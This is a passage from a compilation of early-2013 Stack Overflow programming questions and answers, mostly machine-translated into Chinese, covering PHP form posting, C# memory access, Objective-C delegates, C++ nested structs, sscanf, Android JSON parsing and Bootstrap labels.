现在，了解平面和非平面结构元素（或结构函数）之间的区别和相似性很重要。相似之处在于它们在某个社区内运作。对于基本正方形元素，邻域可以用 3x3 矩阵表示，其中每个元素都在元素的邻域中（例如，对于菱形 SE，它也是一个 3x3 矩阵，但角不属于邻里）。在 Matlab 中，这种特定的邻域关系由`ones(3, 3)`或简单地表示`[1 1 1; 1 1 1; 1 1 1]`。扁平化和非扁平化 SE 的区别在于`strel`Matlab中的功能就是这样。非平坦 SE 意味着它可以不同地对待邻居，因此它并不完全依赖于值 0（腐蚀和膨胀的定义稍作修改以处理这种情况）。例如，正方形 SE 在 Matlab 中正确定义为`strel('arbitrary', ones(3, 3), zeros(3, 3))`（指定`zeros(3, 3)`为第二个参数基本上是一个错误，因为你说你没有邻居）。另一方面，可以用无限的方式定义非平面正方形，其中一种可能是`strel('arbitrary', ones(3, 3), [-1 -1 -1; -1 0 -1; -1 -1 -1])`。

总而言之，您很可能使用`strel`不正确。

# php - PHP $_POST is empty

> ID：14111496
> 
> 赞同：1
> 
> 时间：2013-01-01T15:04:09.707
> 
> 标签：php, post

> **Possible Duplicate:**
> [method=“post” enctype=“text/plain” are not compatible?](https://stackoverflow.com/questions/7628249/method-post-enctype-text-plain-are-not-compatible)

I know this topic was few times on this forum, but none of this solved my problem.

When i try send "contact" data from html site, using method POST, on my php site im getting empty $_POST. I checked one hundert sites and tutorials. I did exacly same like it was showed... Using method "GET" im getting data, but i cant go this way. URL too long.

this is my HTML code.

```
<form  name="post" id="post" method="POST" action="http://podsmoczymdiamentem.host56.com/post.php"  enctype="text/plain">
<table BORDER="0" CELLSPACING="0" CELLPADDING="4">
<tr><td colspan="2"><b>Tytuł:</B></TD></tr>
<tr><td colspan="2"><input type="text" name="tytul" id="tytul" size="30"></TD></TR>
<tr><td colspan="2"><b>Treść:</B></TD>
<tr> <td colspan="2"><textarea name="opowiadanie" cols="70" wrap="virtual" rows="30"></TEXTAREA></TD></TR>
<tr><td align="right"></TD><td align="right"><b>Imię:</B><input type="text" name="autor" size="20"></TD></TR>
<tr><td></TD><td align="right"><b>e-mail:</B><input type="text" name="e-mail" size="20"></TD></TR>
<tr> <td>&nbsp;</TD> <td align="right">
<input type="submit" name="submit" value="Wyślij"><input type="reset" name="reset" value="Wyczyść">
</TD></TR>
</TABLE></FORM></div> 
```

and PHP

```
<?php
      if (empty($_POST['submit'])) {
        echo 'Wiadomość jest pusta!';
     }else{    
      $autor = $_POST['autor'];
      $tytul = $_POST['tytul'];
      $subject = "$autor nadesłał swoją opowieść: $tytul";
      $nadawca = $_POST['e-mail'];
      $adresat = 'podsmoczymdiamentem@gmail.com'; 
      $opowiadanie = $_POST['opowiadanie'];
      $headers .= "Content-Type: text/html; charset=ISO-8859-2\r\n";
      $subject = "=?ISO-8859-2?B?".base64_encode($subject)."?=";
      $tresc = "Witaj Marcinie. Użytkownik <b>$autor</b> nadesłał opowiadanie do twej karczmy. Oto ono:<br><br><b><h1>$tytul</h1></b><br><br> $opowiadanie";
      $mail_sent = @mail( $adresat, $subject, $tresc, $headers);
      if($mail_sent == TRUE)
        echo 'Wiadomość została wysłana.';
      else
        echo 'Ups. Coś nie wyszło. Skontaktuj się z karczmarzem PSD w celu wyjaśnienia problemu.';
      }
?> 
```

what im doing wrong?

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-01T15:08:54.483

You are using the wrong encoding type. Use `application/x-www-form-urlencoded` instead of `text/plain`.

# c# - 尝试直接从内存中读取（C#）

> ID：14111497
> 
> 赞同：1
> 
> 时间：2013-01-01T15:04:24.673
> 
> 标签：c#, memory

我试图用 C# 直接从内存中读取一个字节值。`Marshal.Copy` `Marshal.ReadByte`我在所有范围内尝试了许多不同的地址。

我总是得到例外：

> *System.AccessViolationException：试图读取或写入受保护的内存。这通常表明其他内存已损坏。*

我该怎么做才能访问受保护的内存？

我使用了一些内存查看工具，这些工具可以毫无问题地访问整个内存。

例子：

```
IntPtr bufPtr = new IntPtr(0x00000772);
byte data = Marshal.ReadByte(bufPtr); 
```

该地址不在已知进程中，因此我无法使用`ReadProcessMemory()`或类似的东西。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-01T15:58:25.830

```
 IntPtr bufPtr = new IntPtr(0x00000772); 
```

那*永远*都行不通，虚拟内存地址空间的底部 64KB 是保留的，永远不能被引用。这是针对空指针错误的一种对策，意外使用一个可确保抛出 AccessViolationException，通常会终止程序。

您不能选择任意地址，您选择的数字必须是映射的虚拟内存区域的地址。查找有效地址至少需要对 VirtualQuery() 进行 pinvoke 调用。有用性仍然非常有限，在数百万个可能的有效地址中，您将不知道您实际阅读的是什么。添加垃圾收集器，当它压缩堆时随机移动东西，你找到任何有用的东西的几率几乎为零。

您可以从 SysInternals 的[VMMap 实用程序](http://technet.microsoft.com/en-us/sysinternals/dd535533.aspx)中了解如何使用进程的虚拟内存地址空间。需要一本关于操作系统设计的介绍性书籍和一本像 Windows Internals 这样的书才能理解这一切。

# checkbox - 在带有复选框和提交按钮的文本框中准备“文本”

> ID：14111498
> 
> 赞同：0
> 
> 时间：2013-01-01T15:04:31.880
> 
> 标签：checkbox, textbox, submit, webpage

很抱歉占用您的时间。首先不要生气，也请不要因为问这个问题而责备我。在我问你之前，我真的试图阅读太多的培训书籍和视频。这是我的问题，不知道从哪里开始。
**项目：**复选框，提交按钮，文本区域
**我需要在互联网页面上做什么：**单击提交按钮时；如果选中复选框，则用该复选框表示的文本将出现在 textarea 中。例如：[复选框]我 30 岁 >>>> [提交] = [（文本框）我 30 岁] 我可以用 asp.net 做到这一点。但不想使用那种方法。
jquery 可以做到这一点吗？还是我必须使用 php？
你能告诉我基本代码吗？
太感谢了...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:23:08.293

你可以用jquery做到这一点......试试这个......

检查复选框是否被选中...

```
$('#checkbox_id').is(':checked'){
    var value = $('#checked_value_id').val();
}

<button id="button" onclick="post_value()">submit</button>

function post_value() {

    $('#button').live('click', function() {
        $('#textbox_id').val() = value;
});
} 
```

这可能会帮助你...

# android - Pulse 新闻应用如何在 android 中实现带有垂直滚动或列表视图的水平滚动视图？

> ID：14111500
> 
> 赞同：0
> 
> 时间：2013-01-01T15:04:43.253
> 
> 标签：android, android-layout, android-widget

我想开发一个与 Android 上的 Pulse 应用类似的 UI 实现。没有原生 Android 组件可用于带有适配器或延迟加载的水平滚动视图。

他们是如何制作这个 UI 的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T15:28:08.617

我不知道 Pulse 应用程序是如何做到的，但也许您可以尝试使用`Horizontal Listview`此处： http: [//www.dev-smart.com/archives/34](http://www.dev-smart.com/archives/34)。

# objective-c - 自定义委托遇到问题

> ID：14111501
> 
> 赞同：0
> 
> 时间：2013-01-01T15:04:47.907
> 
> 标签：objective-c, delegates

我在编程方面相当陌生（我没有编程方面的教育——我所知道的一切都是通过阅读教程获得的）并且在 XCode 和 iOS 开发方面是全新的。到目前为止，我了解开发 iOS 应用程序的基础知识，但我无法弄清楚委托是如何工作的。我理解使用委托背后的想法，但我不知道在尝试实现委托时我做错了什么。我创建了一个小示例（单视图应用程序）来说明我如何实现自定义委托，希望您能告诉我我做错了什么。

我正在使用启用了 ARC 的 XCode 4.5.2、iOS6.0。

在示例中，我创建了一个简单的 NSObject 子类 (TestClassWithDelegate)。TestClassWithDelegate.h 看起来像这样：

```
@protocol TestDelegate <NSObject>

-(void)stringToWrite:(NSString *)aString;

@end

@interface TestClassWithDelegate : NSObject

@property (weak, nonatomic) id<TestDelegate> delegate;

-(TestClassWithDelegate *)initWithString:(NSString *)theString;

@end 
```

TestClassWithDelegate.m 看起来像这样：

```
#import "TestClassWithDelegate.h"

@implementation TestClassWithDelegate

@synthesize delegate;

-(TestClassWithDelegate *)initWithString:(NSString *)theString
{
    self=[super init];

    [delegate stringToWrite:theString];

    return self;
}

@end 
```

视图控制器 (ViewController) 由一个 UILabel 组成，我想在其中写入一些文本。ViewController.h 看起来像这样：

```
#import "TestClassWithDelegate.h"

@interface ViewController : UIViewController <TestDelegate>

@property (weak, nonatomic) IBOutlet UILabel *testlabel;

@end 
```

ViewController.m 看起来像这样：

```
#import "ViewController.h"

@interface ViewController ()

@end

@implementation ViewController

@synthesize testlabel;

- (void)viewDidLoad
{
    [super viewDidLoad];
    self.testlabel.text = @"Before delegate";
    TestClassWithDelegate *dummy = [[TestClassWithDelegate alloc]    initWithString:@"AfterDelegate"]; //This should init the TestClassWithDelegate which should "trigger" the stringToWrite method.
}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

#pragma mark Test delegate
- (void)stringToWrite:(NSString *)aString
{
    self.testlabel.text = aString;
}
@end 
```

上面例子的问题是视图上的标签只写了“Before delegate”，我希望它写“AfterDelegate”。

非常感谢所有帮助。新年快乐。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-01T15:11:30.210

您还没有在任何地方设置委托，所以它将是`nil`. 您需要`initWithString:delegate:`代替`initWithString:`或（更好）只创建对象，设置委托并单独发送字符串。

您可能犯了一个（常见）错误，即您假设`@synthesize`实际上在您的代码中创建了一个对象并为其分配了一个值。它不是。它是（现在大部分是多余的！）编译器为属性创建访问器方法的指令。

下面是您的委托类的一个稍微修改的示例，以及一些示例用法：

.h 文件：

```
@interface TestClassWithDelegate : NSObject

@property (weak, nonatomic) id<TestDelegate> delegate;
-(void)processString:(NSString*)string

@end 
```

.m 文件：

```
@implementation TestClassWithDelegate

-(void)processString:(NSString *)theString
{
   [delegate stringToWrite:theString];
}

@end 
```

用法：

```
TestClassWithDelegate *test = [TestClassWithDelegate new];
[test processString:@"Hello!"]; // Nothing will happen, there is no delegate
test.delegate = self;
[test processString:@"Hello!"]; // Delegate method will be called. 
```

# c++ - 使用自己的结构在头类中定义函数？

> ID：14111504
> 
> 赞同：0
> 
> 时间：2013-01-01T15:05:30.193
> 
> 标签：c++, nested-class

```
class List{
        public:
        List();
        void add(int x);
        void remove();
        void display();
        void findingEvens(Node* n, Node* &h);
        private:
        struct Node{
                Node* next;
                int data;

        };
        Node* head;

    }; 
```

我的头类中有上面的代码，在成员函数中

```
void findingEvens(Node* n, Node* &h); 
```

问题出在主类中，除了我已经包含 list.h 之外，它对以下代码给出了错误，

```
 Node *result = 0;
    cout << findingEvens(l, result);
    l.display(); 
```

作为一个错误，它说

`error: ‘Node’ was not declared in this scope`

但是为了在这个范围内声明它，我已经包含了 list.h 类。我错了吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T15:07:44.533

> **然而主要问题是在函数的原型中`findingEvents`它给出了一个错误`Node*`但是它已经定义了**

您使用编译器在同一文件中看到的*类型*之前的类型。所以编译器无法理解什么是`Node`
声明结构后的函数声明。

```
 public:
        List();
        void add(int x);
        void remove();
        void display();
        private:
        struct Node{
                Node* next;
                int data;

        };
        Node* head;
        void findingEvens(List::Node* n, List::Node* &h); 
```

* * *

`Node`是嵌套结构。您需要通过使用其完整限定告诉编译器在哪里找到它：

```
List::Node *result = 0;
^^^^^^^^^^^^ 
```

您需要阅读有关**[嵌套类](http://publib.boulder.ibm.com/infocenter/comphelp/v8v101/index.jsp?topic=/com.ibm.xlcpp8a.doc/language/ref/cplr061.htm)**的信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T15:10:51.753

尝试将 findEvens 的原型移动到`struct Node`. 您现在应该删除`private:`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T15:16:14.017

这个答案不再有用了，但这里是固定代码：

```
class List{
public:
    List();
    void add(int x);
    void remove();
    void display();

    struct Node {
        struct Node* next;
        int data;
    };

    void findingEvens(Node* n, Node* &h);
private:
    Node* head;
}; 
```

# c# - VS 2012 sqlite 设计时间

> ID：14111505
> 
> 赞同：3
> 
> 时间：2013-01-01T15:05:34.250
> 
> 标签：c#, entity-framework, sqlite, visual-studio-2012

所以现在**1.0.83.0**刚刚发布，我想我可以再次处理需要**SQLite**模型（edmx 文件，EF）的项目。
所以我 从[这里下载了](http://system.data.sqlite.org/index.html/doc/trunk/www/downloads.wiki)**sqlite-netFx45-setup-bundle-x86-2012-1.0.83.0.exe**（“这个安装包能够安装**Visual Studio 2012**的设计时组件。”）。 所以我安装了它并检查了复选框是否显示：“集成到 VS 2012”。现在当我启动 VS 2012 时（即使在重新启动后）。当我选择将新实体事物添加到我的项目时，我不得不说。有 MS SQL server、SQL server compact 等，但没有 sqlite！有谁知道我应该怎么做才能解决这个问题？ **`New connection" -> Select Data source`**

 *** * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T21:02:47.720

我也无法让 System.Data.SQLite v.1.0.83.0 设计时在 VS2012 中工作，我最终使用了两天前发布的这个人 (user676797) 答案的 devart。 [SQLite 是否适用于 VS 2012 和 .NET 4.5？](https://stackoverflow.com/questions/11291423/sqlite-with-visual-studio-2012-and-net-4-5?rq=1 "标题")

我发现免费版本（devart.com“dotconnect for SQLite”）很容易安装并且在第一次尝试时就可以使用。我花了很多时间试图从 System.Data.SQLite 得到任何东西来工作，但从来没有。**

# c# - App.GetResourceStream 返回的流的最合适用法

> ID：14111506
> 
> 赞同：0
> 
> 时间：2013-01-01T15:05:58.803
> 
> 标签：c#, wpf, resources, stream, idisposable

我的问题已经[在 WP7 上的 Application.GetResourceStream 返回的发布底层流](https://stackoverflow.com/questions/6200732/releasing-underlying-stream-returned-by-application-getresourcestream-on-wp7)中被问到了，但我对这个问题有几个变体：

1.  这适用于桌面 WPF 应用程序，而不是 WP7，如果它有任何区别的话。
2.  我必须决定是否`using`在构建在流之上的流阅读器上使用块。

这是一些代码：

```
System.Windows.Resources.StreamResourceInfo ri = 
   App.GetResourceStream(new Uri("Resources/Idioms.txt", UriKind.Relative));
using (System.IO.StreamReader sr = new System.IO.StreamReader(ri.Stream))
{
   idioms = sr.ReadToEnd().Split(lineSeps, StringSplitOptions.RemoveEmptyEntries);
} 
```

现在 StreamReader 的 close 方法（我假设它是实现的方法`IDisposable.Dispose`）表明它也关闭了底层流（我假设它也在实现`IDisposable.Dispose`）。

关闭或处置`IO.Stream`由`GetResourceStream`' 的`Stream`属性提供的对象也是如此：

1.  预期的
2.  可接受，或
3.  不正确

`using`（我应该在流顶部构建的阅读器上使用还是避免使用？）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T00:15:06.303

`StreamReader`的 ctor 有一个重载，可让您告诉它不要关闭流。

另外，你有一点倒退（除非我误解了）。这`Dispose`是调用的方法`Close`，而不是相反。

# android - 部分屏幕上的视频

> ID：14111511
> 
> 赞同：0
> 
> 时间：2013-01-01T15:06:25.890
> 
> 标签：android, cordova, video, phonegap-plugins

我需要使用 PhoneGap for Android 将视频流式传输到平板电脑。但事情是这样的：我不希望它全屏播放，而只在部分屏幕上播放。那可能吗？我尝试搜索，但似乎没有关于该主题的内容。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T03:28:18.610

这可以在 Android 4.x 上使用 video 标签，但在早期版本的 Android 上使用 video 标签是不可能的。请参阅[我的帖子](http://simonmacdonald.blogspot.ca/2012/10/partial-support-for-video-tag-in.html)。

如果您需要支持早期版本的 Android，您需要设置[多个视图](http://docs.phonegap.com/en/2.2.0/guide_cordova-webview_android.md.html#Embedding%20Cordova%20WebView%20on%20Android)并进行活动。

# c# - C# 查找发件人

> ID：14111512
> 
> 赞同：2
> 
> 时间：2013-01-01T15:06:31.880
> 
> 标签：c#, object, sender

```
private void buttonCheck(object sender, EventArgs e)
{
   Type x = sender.GetType();
   var y = Activator.CreateInstance(x); //sends me back to the original problem : sender is an object, not a usable object.

   var x = (Button)sender;  // == button, but you never know what sender is until it's already in this function... so 
   dynamic z = sender; //gives you the image of sender i'm looking for, but it's at runtime, so no intellisense/actual compiletime knowledge of what sender is.
} 
```

在没有事先知道类 sender 实际带入这个方法的情况下，你如何去创建一个可用的 sender 实例？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-01T15:35:17.950

在绝大多数情况下*，您*知道哪些控件将触发事件，因为*您*（程序员）将它们连接起来。例如，如果您将此事件连接到一个按钮（或什至多个按钮），您知道发送者是 a `Button`，因此您可以强制转换：

```
var b = sender as Button; 
```

或者

```
var b = (Button)sender; 
```

任何一个都会给你完整的智能感知。

如果将此事件连接到*多种*控制类型，最好的办法是检查每种可能的类型：

```
if(sender is Button)
//  cast to Button
else if (sender is TextBox)
//  cast to TextBox
else is (sender is CobmoBox)
//  cast to ComboBox 
```

它可能看起来很混乱，但是由于您没有在事件处理程序中说明您真正想要*做什么，这是**在一个事件*中处理多种可能的发件人类型的最干净的方式。

另一种选择是只创建多个事件处理程序（每种类型一个）并将它们连接到它们各自的类型。我想不出 a`Button`和 a之间有很多代码重用场景`TextBox`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T15:35:55.780

我认为**动态**关键字是您正在寻找的。在编译时编译器假定`Text`btn 中有属性。

```
 private void button1_Click(object sender, EventArgs e)
  {
     var btn = (dynamic)sender;

     string text = btn.Text;
  } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-07-21T19:27:50.150

这是一个从 DataGridView 控件中清除默认选择的 DataBindingComplete 变体。我有多个跨多个选项卡的 DataGridView 控件，并且只需要一个事件处理程序即可，这太棒了。这是基于 VladL 的回应，所以所有的功劳都应该归于他们。

```
 private void Dynamic_DataBindingComplete(Object sender, DataGridViewBindingCompleteEventArgs e)
    {
        var control = (dynamic) sender;
        control.ClearSelection();
    } 
```

# android - Android 应用内结算（IAB 版本 3）

> ID：14111522
> 
> 赞同：1
> 
> 时间：2013-01-01T15:08:15.940
> 
> 标签：android, in-app-purchase, in-app-billing

我已经尝试了版本 3 [http://developer.android.com/training/in-app-billing/preparing-iab-app.html#GetSample](http://developer.android.com/training/in-app-billing/preparing-iab-app.html#GetSample)的应用内计费示例应用程序？应用程序是 TrivialDrive。当我尝试按照自述文件中的步骤测试应用程序时。文件。在将其作为草稿上传到市场并尝试使用测试设备购买应用程序内后，我收到一条错误消息，指出**用户不符合此购买条件**。为什么我收到此消息提前谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-09T15:38:49.990

我终于通过在用户帐户和权限选项卡上将“许可测试响应”更改为“许可”来实现这一点。

======================编辑=========================== ======

好的 以下是查找此设置的确切说明：

在 Google Play 开发者控制台中，使用“新设计”，左侧有“所有应用程序”“报告”和“设置”。选择设置。

有一个许可证测试框。您必须输入测试设备上帐户的 gmail 地址。这不能与开发者帐户的电子邮件地址相同。（您不能向自己购买。）

在许可证测试下方，有一个“许可证测试响应”下拉菜单。选择许可。

我想这在某个地方的文档中有所描述，但我错过了:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T15:21:33.423

### 编辑：

此错误的实际原因：

如果未经授权的用户尝试购买商品，则应显示此消息。

因此，如果应用程序未发布，非测试用户在尝试购买时应该会收到此错误。

我意识到，Google play 需要时间来更新应用商店的变化。所以你不能指望立即发生变化。相反，您应该等待，就我而言，平均需要 2/3 小时。

仍然可能有一些未知的错误，我无法想象。

### 我的案例：

首先我试图从我的测试设备购买仍然出现此错误，但等待一段时间后我没有收到此错误。所以我认为时间是这里的原因。

其次，我尝试使用非测试设备，这是未经授权的设备，因为该应用程序未发布。

# cassandra - 在 Apache Cassandra 中，是否可以使用 CQL 3.0 设置比较器和默认验证器？

> ID：14111523
> 
> 赞同：1
> 
> 时间：2013-01-01T15:08:22.087
> 
> 标签：cassandra, cql, cql3

根据 Datastax 网络研讨会“ [C*hristmas Comes Early – Creating your First Java Application with Apache Cassandra](http://www.datastax.com/resources/webinars/collegecredit) ”，看起来不属于架构的插入列默认为字节数据类型，而列名与字符串相关联。有什么办法可以改变这个吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-06T18:33:45.670

默认情况下，字节类型被用作 cassandra-column-values 的验证器。对于插入的记录，这不能更改。在 cassandra-cli 中使用以下命令查看 ascii 中的结果

cli> 假设验证器为 ascii；

cli>列表

# c++ - 如何设置 sscanf() 以忽略字符串开头的字符？

> ID：14111524
> 
> 赞同：3
> 
> 时间：2013-01-01T15:08:24.790
> 
> 标签：c++, c, scanf

我有一个字符串如下

```
 char row[]="11/12/1999 foo:bar some data..... ms:12123343 hot:32"; 
```

我想使用 sscanf 将 'ms' val 插入到 int 变量中。但我不知道如何配置 ssscanf 以忽略行中的第一个数据。我尝试打击，但不做这项工作。

```
int i;
sscanf(row,".*ms:%d",i); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-01T16:18:53.800

我认为，最好不要使用 sscanf() 来忽略数据，而是使用另一个函数来获取所需的字符串部分。

我建议[strstr()](http://pubs.opengroup.org/onlinepubs/9699919799/functions/strstr.html)。例如

```
#include <stdio.h>
#include <string.h>

int main(void) {
    char row[] = "11/12/1999 foo:54654 some data..... ms:12123343 hot:32";
    char *ms;
    int i;

    ms = strstr(row, "ms:");
    if (ms == NULL) /* error: no "ms:" in row */;
    if (sscanf(ms + 3, "%d", &i) != 1) /* error: invalid data */;
    printf("ms value is %d.\n", i);
    return 0;
} 
```

您可以看到[在 ideone 运行的代码](http://ideone.com/4We3UN)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T15:15:30.947

小丑用于贝壳，但`sscanf`不以`*`这种方式对待角色。

> **7.21.6.2`fscanf`函数**
> ——一个可选的赋值抑制字符 *。

有几种解决方案。例如：

```
#include <stdio.h>
#include <string.h>

char *pend = strrchr(row, ':');
sscanf(pend, ":%d", &i); 
```

您也可以使用来自`scanf`或的扫描集`strstr`。

# android - Android JSON解析问题

> ID：14111526
> 
> 赞同：1
> 
> 时间：2013-01-01T15:08:37.317
> 
> 标签：android, json, parsing

我有一个包含一堆不同类别的项目的 json 文件，我想检查类别，如果与给定条件匹配，我想在 listview 中显示，这就是我想出的.. 但它确实有效，listview 是空的

```
ArrayList<HashMap<String, String>> eventsList = new ArrayList<HashMap<String, String>>();

        try {
            JinnerObject = Jobject.getJSONObject("data");
            Jarray = JinnerObject.getJSONArray("events");
            for(int i = 0; i < Jarray.length(); i++){
                JeventObject = Jarray.getJSONObject(i);

                String  _EV_OP1         = JeventObject.getString(EV_OP1);
                String  _EV_OP2         = JeventObject.getString(EV_OP2);
                String  _EV_COEF1       = JeventObject.getString(EV_COEF1);
                String  _EV_COEF2       = JeventObject.getString(EV_COEF2);
                String  _EV_STIME       = JeventObject.getString(EV_STIME);
                String  _EV_HOST        = JeventObject.getString(EV_HOST);
                String  _EV_DESC        = JeventObject.getString(EV_DESC);
                String  _EV_TIP         = JeventObject.getString(EV_TIP);
                String  _EV_CAT         = JeventObject.getString(EV_CAT);

                    if(_EV_CAT == C){
                    HashMap<String, String> Events_map = new HashMap<String, String>();

                    Events_map.put(EV_OP1,      _EV_OP1);
                    Events_map.put(EV_OP2,      _EV_OP2);
                    Events_map.put(EV_COEF1,    _EV_COEF1);
                    Events_map.put(EV_COEF2,    _EV_COEF2);
                    Events_map.put(EV_STIME,    _EV_STIME);
                    Events_map.put(EV_HOST,     _EV_HOST);
                    Events_map.put(EV_DESC,     _EV_DESC);
                    Events_map.put(EV_TIP,      _EV_TIP);

                    eventsList.add(Events_map);
                    }
            }
        } catch (JSONException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T15:13:56.820

改变

```
if(_EV_CAT == C) 
```

到

```
if(_EV_CAT.equalsIgnoreCase(C)) 
```

用于比较字符串总是使用`equalsIgnoreCase`or `equals`because`==`运算符比较两个对象引用以查看它们是否引用同一个实例

# json - Grails 和 mongo DB 嵌套数据结构

> ID：14111528
> 
> 赞同：0
> 
> 时间：2013-01-01T15:08:50.117
> 
> 标签：json, mongodb, grails, grails-domain-class, database

我有一个与 mongo DB 交互的 Grails 项目。我想知道创建表示嵌套数据的域类的最佳实践是什么。

数据例如：

```
settings:{
  user:{id:1234 , name:"john"}
  colors:{header:"red" , footer:"white"}
} 
```

将不胜感激任何帮助或代码示例

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T18:41:04.673

I think it is reasonable to presume that you are using mongodb plugin.

To put it simple:

```
Class Settings {
    int user_id
    String user_name
    String colors_header
    String colors_footer
} 
```

If there is a legacy mongodb collection like you presented:

```
Class User {
    int id
    String name
}
Class Color {
    String header
    String footer
}
Class Settings{
  User user
  Colors colors
  static embedded = ['user','colors']
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-03T08:25:19.210

由于 MongoDB 是完全无模式的，这意味着您不会像关系数据库那样受限于固定数量的列。所以创建嵌套数据相当容易。

这是一个例子：

```
//the domain class
class Settings {
    Map user
    Map colors
} 
```

* * *

```
//in the groovy controller
def s = new Settings(user: [name:"jhon"],colors:[header:"red" ,footer:"white"] )
s.save(flush: true) 
```

# java - “java.lang.UnsupportedOperationException”在 android 上使用 Net.WebSocket

> ID：14111533
> 
> 赞同：0
> 
> 时间：2013-01-01T15:09:10.390
> 
> 标签：java, android, playn

我只是想连接到我的 websocket 服务器：

```
ws = net().createWebSocket("ws://192.168.0.3:8000/sample", this); 
```

当我用**mvn test -Pjava测试它时它工作正常**

但是当我用我的谷歌 Nexus S（在冰淇淋三明治下）加载它时，我得到：

```
E/AndroidRuntime( 4321): FATAL EXCEPTION: GLThread 352
E/AndroidRuntime( 4321): java.lang.UnsupportedOperationException
E/AndroidRuntime( 4321):        at playn.core.NetImpl.createWebSocket(NetImpl.java:27) 
E/AndroidRuntime( 4321):        at com.github.dawicorti.qrcomsample.core.CommunicationScreen.<init>(CommunicationScreen.java:34)
E/AndroidRuntime( 4321):        at com.github.dawicorti.qrcomsample.core.QRComSample.init(QRComSample.java:12)
E/AndroidRuntime( 4321):        at playn.android.AndroidPlatform.run(AndroidPlatform.java:170)
E/AndroidRuntime( 4321):        at playn.core.PlayN.run(PlayN.java:47)
E/AndroidRuntime( 4321):        at com.github.dawicorti.qrcomsample.android.QRComSampleActivity.main(QRComSampleActivity.java:13)
E/AndroidRuntime( 4321):        at playn.android.GameViewGL$3.run(GameViewGL.java:94)
E/AndroidRuntime( 4321):        at android.opengl.GLSurfaceView$GLThread.guardedRun(GLSurfaceView.java:1462)
E/AndroidRuntime( 4321):        at android.opengl.GLSurfaceView$GLThread.run(GLSurfaceView.java:1240)
W/ActivityManager(  249):   Force finishing activity com.github.dawicorti.qrcomsample.android/.QRComSampleActivity 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T23:32:00.510

Android 后端不支持 WebSockets（截至 2013 年 3 月）。它们仅在 Java 和 HTML 后端中受支持。

我将更新平台状态页面。

# css - 标签组件显示问题

> ID：14111534
> 
> 赞同：0
> 
> 时间：2013-01-01T15:09:24.307
> 
> 标签：css, twitter-bootstrap

在下面链接的网页上，我正在尝试使用标签来显示在标题“我们擅长什么！”下找到的项目的垂直列表。默认元素是显示标签的跨度，但是多个标签堆叠在同一行上，这不是我想要在视觉上实现的，我实际上希望每个标签占据单独的行。（这可能与`display: inline-block;`CSS 规则有关吗？）。是否有更改标记或 CSS 属性来帮助解决这个问题？

[http://openreachmarketing.co.uk/index.php](http://openreachmarketing.co.uk/index.php)

```
 <span class="odd label label-info">Accident Compensation</span>
  <span class="even label label-warning">PPI</span>
  <span class="odd label label-important">Buildings and Contents Insurance</span>
  <span class="even label label-info">Utility Switches</span>
  <span class="odd label label-warning">Car Loans</span>
  <span class="even label label-important">Solar Panels</span> 
```

这是引导标签的文档：

[http://twitter.github.com/bootstrap/components.html#labels-badges](http://twitter.github.com/bootstrap/components.html#labels-badges)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:26:31.003

### 你有`h4`标题！

```
<h4 class="heading">What we specialise in!</h4> 
```

我们**擅长什么！**行为与预期完全一致。但是，如果您希望它像 一样显示`label`，则清除`H4`那里的样式并给出此标记。

```
<h4><span class="label">What we specialise in!</span></h4> 
```

或者

```
<h4><span class="odd label label-info">What we specialise in!</span></h4> 
```

其他的事情，如：事故赔偿 PPI 建筑物和财产保险 公用事业开关 汽车贷款 太阳能电池板等表现正确。

### 用于多行显示的 CSS！

```
.span4.margbot20 .label {
    float: left;
    clear: both;
    margin: 0 0 5px;
} 
```

### 截屏

![](../Images/96409330628efb6c5dc39021479075c0.png)

### 只是标记更改

```
<p><span class="odd label label-info">Accident Compensation</span></p>
<p><span class="even label label-warning">PPI</span></p>
<p><span class="odd label label-important">Buildings and Contents Insurance</span></p>
<p><span class="even label label-info">Utility Switches</span></p>
<p><span class="odd label label-warning">Car Loans</span></p>
<p><span class="even label label-important">Solar Panels</span></p> 
```

# java - 扩展可比较的泛型

> ID：14111536
> 
> 赞同：0
> 
> 时间：2013-01-01T15:09:53.223
> 
> 标签：java, generics, icomparable

我正在用 Java 开发一个基于模板的类，它实现了各种树结构（例如标准二叉树、红黑树或 B-Tree）。我的想法是让它像 Java Collections 中的各种列表一样完成。那是一个接口类，然后由指定的树扩展。但是，我遇到了一个奇怪的问题：

```
BSTree.java:12: error: BSTree is not abstract and does not override abstract method     search(Comparable) in Tree
public class BSTree<T extends Comparable<T>> extends Tree {
       ^

BSTree.java:20: error: name clash: add(T#1) in BSTree and add(T#2) in Tree have the same erasure, yet neither overrides the other
    public void add(T key) throws NullPointerException {
                ^
  where T#1,T#2 are type-variables:
    T#1 extends Comparable<T#1> declared in class BSTree
    T#2 extends Comparable<T#2> declared in class Tree

BSTree.java:28: error: method compareTo in interface Comparable<T#2> cannot be applied     to given types;
                if (key.compareTo(ptr.key) == -1) {
                   ^
  required: T#1
  found: Comparable
